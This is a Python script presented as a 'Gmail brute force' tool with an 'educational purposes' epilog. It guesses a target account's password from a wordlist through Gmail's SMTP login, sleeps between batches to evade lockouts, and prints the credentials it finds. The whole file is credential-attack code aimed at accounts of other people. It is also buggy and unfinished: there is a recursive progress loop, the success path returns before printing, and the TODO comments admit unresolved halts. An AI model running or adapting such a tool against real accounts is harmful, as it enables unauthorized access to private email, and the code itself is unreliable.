#!/usr/bin/python3
import argparse, smtplib, os, time, sys, random, datetime

# TODOs
# finish readme
# finish SEO stuff 
# test on new Linux, Mac, and Windows machine
# add copy paste code comments 

BATCH_ATTEMPTS = 10

#
# display progress bar 
#

def progress(curr, total, suffix=""): 
    bar_length = 100
    filled_length = int(round(bar_length * curr / float(total)))
    percent = round(100.0 * curr/float(total), 1)
    bar = ("=" * filled_length ) + ("-" * (bar_length - filled_length))
    sys.stdout.write("[%s] %s%s ...%s\r" %(bar, percent, "%", suffix))
    sys.stdout.flush()
    for i in range(11):
        time.sleep(random.random())
        progress(i,10)

#
# try to login into the gmail account
#

def authenticate(server, target_email, password):
    try:
        # attempt to login 
        server.login(target_email, password)
        return True 
    except smtplib.SMTPAuthenticationError:
        # error that happens when the password is incorrect 
        return False 
    except Exception as e:
        # print all other types of errors and exit program 
        print(f"Error: {str(e)}")
        exit()

#
# iterate through the password list 
#

def attack(target_email, password_list, attack_duration):
    # start a server
    server = smtp()                                                         # halt is here 
    # placeholders
    valid_password = None
    password_list_index = 0 
    counter = 0
    print("1") #                                                        TODO does not print 
    # loop thru passwords 
    for password in password_list:
        auth_result = authenticate(server, target_email, password)
        if auth_result == True: 
            valid_password = password 

            return 
        elif (counter < BATCH_ATTEMPTS): 
            counter += 1
            progress(password_list_index, len(password_list))
        else: 
            # wait  
            print(f"Sleeping for {attack_duration} seconds.")
            time.sleep(int(attack_duration))
            # restart server 
            server.close()
            server = smtp()
            # reset counter
            counter = 0

    if valid_password is None:
        server.close()
        print("No password was found. Please use a different password list.")
        print("To save time, ensure your new password list excludes passwords you have already tried.")
        print("You can do this by: $ file1 file 2 ____________________")                                # TODO put in command 
        print("Thank you for using gmail-brute-force. Goodbye!")
        exit() 
    else: 
        server.close()
        # display product 
        # display credential page
        print(f"Credentials\nTarget email: {target_email}\nPassword: {valid_password}")
        curr_time = datetime.datetime.now()
        print("Current time: " + curr_time.strftime("%d-%m-%Y %H:%M:%S"))

#
# Connect to GMail's SMTP server 
#

def smtp():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    return server

#
# parse command line arguments entered by attacker 
#

def cmd_parse(): 
    # Create the parser and add arguments
    parser = argparse.ArgumentParser(prog="gmail-brute-force.py", 
             description="Brute-force GMail accounts",
             epilog="Made for educational purposes. Creator: Olivia Gallucci")
    parser.add_argument("target_email", type=str, help="email you want to attack")
    parser.add_argument("password_list", type=str, help="[/path/password_list.txt] Each password should be on a new line")
    parser.add_argument("attack_duration", type=int, help="amount of seconds you want to wait between 8 failed attacks")
    # separate the arguments into a list 
    args = parser.parse_args()
    return args

#
# product display 
#

def product_display():
    # clear terminal 
    os.system("cls" if os.name == "nt" else "clear")
    # print title 
    print("*****                   *****\n" +
          "***** GMAIL BRUTE FORCE *****\n" + 
          "*****                   *****\n")

#
# execute the mail program 
#

def main():
    # attacker initial input 
    args = cmd_parse()
    target_email = args.target_email 
    attack_duration = args.attack_duration

    # show product info
    product_display()
    
    # make a list of the passwords from a file 
    with open(args.password_list) as file:
        pass_list = file.readlines()
        
    # remove new line characters
    password_list = [x.strip() for x in pass_list]
    file.close()
    
    attack(target_email, password_list, attack_duration)

    print("Thank you for using gmail-brute-force. Goodbye.")
    print("END")

if __name__ == "__main__":
    main()
